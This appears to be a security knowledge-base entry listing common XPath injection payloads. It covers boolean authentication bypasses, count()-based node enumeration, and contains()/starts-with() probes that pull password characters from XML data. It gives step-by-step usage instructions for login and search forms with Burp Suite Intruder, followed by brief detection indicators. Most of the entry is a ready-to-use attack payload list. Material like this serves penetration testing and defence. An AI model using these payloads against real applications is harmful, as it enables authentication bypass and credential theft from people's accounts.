---
id: c72c7977-4090-4f02-896d-386be50b8872
name: Common-XPath-Injection-Payloads
type: code
language: xpath
verified: true
created_at: '2023-04-06T03:56:41.389519+00:00'
updated_at: '2023-04-10T20:24:47.983926+00:00'
platforms:
  - Web
tags:
  - xpath-injection
  - payload
  - enumeration
validated: true
---

# Common-XPath-Injection-Payloads

## Code

```xpath
' or '1'='1
' or ''=' 
x' or 1=1 or 'x'='y
//
/*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*, '
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

## Description

This collection of XPath injection payloads includes boolean-based blind injections, node enumeration, and attribute counting techniques. They are used to probe XML structures, bypass filters, and extract data like user details in vulnerable applications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| search | Search parameter prefix for targeted injections | Har |

## Usage

Inject these into vulnerable fields sequentially: start with ' or '1'='1 for bypass, use count() for enumeration, then targeted contains() or starts-with() for data extraction. Ideal for Burp Suite Intruder or manual testing in login/search forms.

## Detection

- Intrusion detection for repeated quote/slash patterns in inputs.
- XML parser logs indicating invalid node traversals or count functions.
- Anomalous response times in blind boolean tests.

## Related

- [[procedures/XPath-Injection-for-User-Account-Retrieval]]
